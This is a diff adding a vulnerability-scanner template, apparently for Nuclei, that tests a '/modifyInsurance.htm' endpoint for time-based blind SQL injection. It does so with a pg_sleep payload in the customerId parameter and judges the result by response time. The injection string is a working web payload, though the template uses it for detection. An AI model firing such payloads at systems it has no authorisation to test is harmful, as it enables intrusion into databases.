@@ -1,0 +1,27 @@
+id: sql-injection-sleep-poc
+
+info:
+  name: SQL Injection Time-based - Sleep
+  author: nie
+  severity: high
+  description: This template detects SQL injection vulnerabilities by checking for time-based blind SQL injections using `pg_sleep()` function in PostgreSQL. The vulnerable endpoint delays the response if the injection is successful.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  tags: sql, sqli, time-based, sleep
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/modifyInsurance.htm?documentCode=-1&insuranceValue=-1&customerId=-1+and+1=(select+1+from+pg_sleep(6))"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "response_time > 6000"
+ 
